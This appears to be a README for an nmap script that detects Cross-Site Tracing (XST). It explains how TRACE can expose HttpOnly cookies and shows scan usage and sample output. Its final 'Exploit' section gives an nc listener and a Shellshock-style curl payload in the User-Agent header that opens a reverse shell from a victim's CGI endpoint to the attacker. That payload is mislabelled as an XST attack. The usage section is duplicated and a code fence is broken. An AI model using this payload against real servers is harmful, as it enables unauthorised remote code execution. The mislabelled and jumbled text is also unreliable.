# XST-Script
Cross Site Tracking
<br>
A Cross-Site Tracing (XST) attack involves the use of Cross-site Scripting (XSS) and the TRACE or TRACK HTTP methods. According to RFC 2616, “TRACE allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information.”, the TRACK method works in the same way but is specific to Microsoft’s IIS web server. XST could be used as a method to steal user’s cookies via Cross-site Scripting (XSS) even if the cookie has the “HttpOnly” flag set or exposes the user’s Authorization header.
<br>
The TRACE method, while apparently harmless, can be successfully leveraged in some scenarios to steal legitimate users’ credentials. This attack technique was discovered by Jeremiah Grossman in 2003, in an attempt to bypass the HttpOnly tag that Microsoft introduced in Internet Explorer 6 sp1 to protect cookies from being accessed by JavaScript. As a matter of fact, one of the most recurring attack patterns in Cross Site Scripting is to access the document.cookie object and send it to a web server controlled by the attacker so that they can hijack the victim’s session. Tagging a cookie as HttpOnly forbids JavaScript to access it, protecting it from being sent to a third party. However, the TRACE method can be used to bypass this protection and access the cookie even in this scenario.
<br>
Modern browsers now prevent TRACE requests being made via JavaScript, however, other ways of sending TRACE requests with browsers have been discovered, such as using Java.

### Usage 
```bash
nmap --script /usr/share/nmap/script/XST.nse -p 80,443 -d (target)

# XST-Script
Cross Site Tracking

### Usage 
```bash
nmap --script /usr/share/nmap/scripts/XST.nse -p 80,443 -d (target)
```
<br>
```bash
PORT    STATE  SERVICE REASON
80/tcp  open   http    syn-ack
| XST: Celah XST [Cross Site Tracing] ditemukan
| Headers:
| Date: Wed, 07 Sep 2022 06:27:39 GMT
| Server: Apache/2.2.8 (Ubuntu) DAV/2
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
443/tcp closed https   conn-refused

Final times for host: srtt: 481 rttvar: 2879  to: 100000
```

### *Exploit
```bash
sudo apt-get install curl nc
nc -nvlp [hacker-port -> default: 4444 TCP]

# script formula [ { :;} ]
curl -k -H 'User-Agent: () { :;}; /bin/bash -c "nc [hacker-ip] [hacker-port] -e [shell -> default: /bin/bash]"' http://[victim-ip]/[cgi-bin-file -> default: cgi-bin/sh_index.cgi]

# serangan code injection melalui kelemahan header http [XST VULN] dan cgi-file yang tersedia atau misconfiguration!
```
